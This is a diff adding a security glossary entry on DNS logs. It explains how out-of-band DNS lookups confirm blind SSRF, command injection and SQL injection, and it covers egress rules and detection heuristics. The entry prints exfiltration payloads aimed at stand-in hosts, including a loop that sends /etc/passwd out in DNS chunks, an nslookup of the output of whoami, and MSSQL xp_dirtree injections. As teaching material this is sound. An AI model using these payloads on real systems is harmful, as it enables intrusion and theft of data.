@@ -1,0 +1,272 @@
+---
+slug: "dns-log"
+term: "DNS Log"
+abbreviation: ""
+shortDefinition: "A record of Domain Name System queries and responses, showing what domain names were looked up, when, and by whom. Used in security testing to detect blind vulnerabilities."
+category: "Security Testing"
+tags: ["dns", "logging", "oob", "monitoring", "blind"]
+relatedTerms: ["dns", "out-of-band", "blind-ssrf", "vps"]
+language: "en"
+hasTranslation: true
+translationSlug: "dns-log"
+difficulty: "intermediate"
+lastUpdated: "2026-02-26"
+sources:
+  - "https://www.cloudflare.com/learning/dns/what-is-dns/"
+---
+
+## Short Definition
+DNS logs show what domain names got looked up. In security testing, you use your own DNS server and watch its logs. When target server looks up your-unique-id.your-domain.com, that lookup appears in logs, proving your exploit worked even if you can't see direct output.
+
+## Full Definition
+DNS logs are records of DNS resolution requests and responses, capturing queries made by systems when translating domain names to IP addresses.
+
+**What DNS logs contain:**
+- Query timestamp
+- Source IP (who asked)
+- Domain queried
+- Query type (A, AAAA, TXT, etc.)
+- Response given
+- Response time
+
+**Example DNS log entry:**
+```
+2026-02-26 10:30:45 | Source: 192.168.1.100 | Query: api.example.com | Type: A | Response: 93.184.216.34
+```
+
+**In security testing:**
+
+Setup your own DNS logger:
+```
+your-domain.com → Your VPS/DNS server
+```
+
+During tests, use unique subdomain:
+```
+test-abc123.your-domain.com
+```
+
+When target looks it up, log shows:
+```
+Query from 54.12.34.56 for test-abc123.your-domain.com
+```
+
+**Popular tools:**
+- interactsh
+- Burp Collaborator
+- RequestBin
+- Custom DNS servers (dnslib, python)
+
+## Why It Matters
+**For security testing:**
+- Detects blind vulnerabilities without direct output
+- Confirms exploitation in filtered environments
+- Works when HTTP requests are blocked
+- Bypasses WAF and filtering
+- Exfiltrates data via subdomain encoding
+
+**For defenders:**
+- Detects data exfiltration attempts
+- Identifies compromised systems
+- Monitors for C2 communication
+- Finds unauthorized external connections
+
+## How Attackers Use It (and Ethical Testing)
+**Blind SSRF confirmation:**
+
+```bash
+# Test payload
+POST /api/image-fetch
+{"url": "http://ssrf-test-xyz.your-domain.com/image.jpg"}
+
+# Check DNS logs on your server
+$ tail -f /var/log/dns-queries.log
+Query from 52.1.2.3: ssrf-test-xyz.your-domain.com
+# SSRF confirmed! Server made DNS lookup
+```
+
+**Data exfiltration via DNS:**
+
+```bash
+# Blind command injection
+; nslookup `whoami`.data.your-domain.com
+
+# DNS log shows:
+Query: root.data.your-domain.com
+# Exfiltrated username: root
+```
+
+**SQL Injection OOB:**
+
+```sql
+-- Extract database name via DNS
+'; DECLARE @db VARCHAR(100);
+SELECT @db = DB_NAME();
+EXEC('master..xp_dirtree "\\' + @db + '.sqli.your-domain.com\a"');--
+
+# DNS log:
+Query: production_db.sqli.your-domain.com
+# Database name: production_db
+```
+
+**Multiple query encoding:**
+
+```bash
+# Exfiltrate sensitive file
+file_contents=$(cat /etc/passwd | base64)
+for chunk in $(echo $file_contents | fold -w 50); do
+  nslookup $chunk.exfil.your-domain.com
+done
+
+# DNS logs receive file in chunks
+```
+
+**Setting up DNS logger:**
+
+```python
+# Simple DNS logger
+from dnslib import DNSRecord, RR, QTYPE, A
+from dnslib.server import DNSServer
+import logging
+
+logging.basicConfig(level=logging.INFO)
+
+class DNSLogger:
+    def resolve(self, request, handler):
+        reply = request.reply()
+        qname = request.q.qname
+        
+        # Log the query
+        logging.info(f"DNS Query: {qname} from {handler.client_address[0]}")
+        
+        # Return any IP (it doesn't matter for logging)
+        reply.add_answer(RR(qname, QTYPE.A, rdata=A("1.2.3.4"), ttl=0))
+        return reply
+
+server = DNSServer(DNSLogger(), port=53, address="0.0.0.0")
+server.start()
+```
+
+## How to Detect or Prevent It
+**Prevention (Defensive):**
+
+**Network controls:**
+```bash
+# Block outbound DNS except to trusted servers
+iptables -A OUTPUT -p udp --dport 53 -d 8.8.8.8 -j ACCEPT
+iptables -A OUTPUT -p udp --dport 53 -j DROP
+
+# Use DNS firewall
+# Allow only corporate DNS servers
+```
+
+**Monitor DNS patterns:**
+```python
+# Alert on suspicious patterns
+def analyze_dns_query(query):
+    # Unusually long subdomain
+    if len(query) > 100:
+        alert("Possible data exfiltration via DNS")
+    
+    # Random-looking subdomain
+    if contains_base64_or_hex(query):
+        alert("Encoded data in DNS query")
+    
+    # Known OOB domains
+    if any(pattern in query for pattern in ['burpcollaborator', 'interact.sh']):
+        alert("Known security testing domain")
+    
+    # Many queries to same unknown domain
+    if query_frequency(domain) > 100:
+        alert("Potential DNS tunneling")
+```
+
+**Detection (as tester, watching your logs):**
+
+**Analyze what you see:**
+```bash
+# Check logs
+grep "Query:" /var/log/dns.log
+
+# Look for patterns:
+- Source IP = target system IP? (confirms it's coming from target)
+- Timing matches your test? (confirms correlation)
+- Subdomain format matches payload? (confirms it worked)
+```
+
+**Automated monitoring:**
+```bash
+# Alert on new queries
+tail -f /var/log/dns.log | while read line; do
+  echo "[$(date)] New DNS query detected!"
+  echo $line
+  # Send notification
+done
+```
+
+## Common Misconceptions
+- "DNS logging requires special setup" - Standard for most servers
+- "Can't exfiltrate much via DNS" - 255 chars per label, multiple queries
+- "DNS queries are encrypted" - Usually plaintext (unless DoH/DoT)
+- "Blocking HTTP blocks everything" - DNS often still allowed
+- "DNS logs don't matter" - Critical for detecting blind exploits
+
+## Real-World Example
+**DNS Exfiltration in APT Attack**
+
+```bash
+# Malware encoded stolen data in DNS queries
+# Pattern seen in logs:
+
+54686973206973207365637265742064617461.exfil.attacker.com
+4d6f7265207365637265742064617461.exfil.attacker.com
+...
+
+# Base64 decoded: "This is secret data"
+# Exfiltrated gigabytes over weeks via DNS
+```
+
+**Bug Bounty - Blind SSRF Discovery**
+
+```bash
+# Target: E-commerce platform
+# Feature: Fetch product image from URL
+
+# Payload:
+POST /admin/fetch-image
+{"url": "http://ssrf-12345.researcher.com/image.jpg"}
+
+# DNS log on researcher's VPS:
+[2026-02-26 10:30:12] Query from 54.xxx.xxx.xxx: ssrf-12345.researcher.com
+
+# Confirmed blind SSRF!
+# Further testing with metadata service:
+{"url": "http://169.254.169.254/"}
+
+# If metadata accessible, DNS log would show:
+# (Some implementations make DNS query first)
+```
+
+**Blind SQLi via DNS**
+
+```sql
+-- Real pentest scenario
+-- Target: Healthcare application
+-- Vulnerability: Blind SQL injection in search parameter
+
+-- Payload:
+search=test'; 
+DECLARE @v VARCHAR(8000);
+SET @v = (SELECT TOP 1 table_name FROM information_schema.tables);
+EXEC('master..xp_dirtree "\\'+@v+'.sqli.tester.com\a"');--
+
+# DNS log showed:
+Query: patients.sqli.tester.com
+
+-- Confirmed SQL injection
+-- Exfiltrated table name: "patients"
+-- Further queries extracted more sensitive info
+```
+
+## Related Terms
+DNS, Out-of-Band, Blind SSRF, VPS, Data Exfiltration
